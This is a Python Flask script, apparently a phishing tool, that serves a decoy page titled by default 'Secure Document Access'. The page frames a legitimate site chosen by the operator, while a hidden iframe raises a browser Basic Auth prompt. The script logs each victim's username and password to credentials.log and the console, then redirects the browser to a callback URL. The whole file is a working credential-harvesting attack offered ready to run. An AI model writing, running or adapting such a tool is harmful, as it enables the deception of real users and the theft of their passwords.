#!/usr/bin/python3
import argparse
from flask import Flask, request, Response
from datetime import datetime

LOG_FILE = "credentials.log"
app = Flask(__name__)
FINAL_URL = ""
VISIBLE_SITE = ""
AUTH_REALM = ""
HTML_PAYLOAD = ""

@app.route('/')
def serve_index():
    """Serves the embedded HTML payload from memory."""
    return HTML_PAYLOAD

@app.route('/a')
def handle_auth():
    """Handles the auth prompt, credential logging, and final redirect."""
    # If the request doesn't have an Authorization header, send a 401 to trigger the prompt.
    if not request.authorization:
        return Response(
            'Authentication Required', 401,
            {'WWW-Authenticate': f'Basic realm="{AUTH_REALM}"'}
        )

    # Credentials received. Extract, log, and prepare the redirect.
    username = request.authorization.username
    password = request.authorization.password
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip_addr = request.remote_addr

    log_entry = f"[{timestamp}] {username}:{password}\n"

    # Print to console and write to log file.
    print(log_entry, end="")
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    # This JavaScript payload executes in the hidden iframe and redirects the main browser window.
    js_redirect = f"<script>window.top.location.href = '{FINAL_URL}';</script>"
    return Response(js_redirect, mimetype='text/html')

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--title", default="Secure Document Access")
    ap.add_argument("--frame-url", required=True)
    ap.add_argument("--callback-url", required=True)
    ap.add_argument("-p", type=int, default=80)
    a = ap.parse_args()
    AUTH_REALM = a.title
    VISIBLE_SITE = a.frame_url
    FINAL_URL = a.callback_url
    HTML_PAYLOAD = f"""<!DOCTYPE html>
<html>
<head><title>{AUTH_REALM}</title><style>body,html{{margin:0;padding:0;height:100%;overflow:hidden}}iframe{{position:absolute;top:0;left:0;width:100%;height:100%;border:none}}#h{{display:none}}</style></head>
<body>
<iframe src="{VISIBLE_SITE}" onload="document.getElementById('h').src='/a'"></iframe>
<iframe id="h"></iframe>
</body>
</html>
"""
    print(f"[*] http://0.0.0.0:{a.p}")
    print(f"[*] log {LOG_FILE}")
    print(f"[*] frame {VISIBLE_SITE}")
    print(f"[*] callback {FINAL_URL}")
    app.run(host="0.0.0.0", port=a.p)
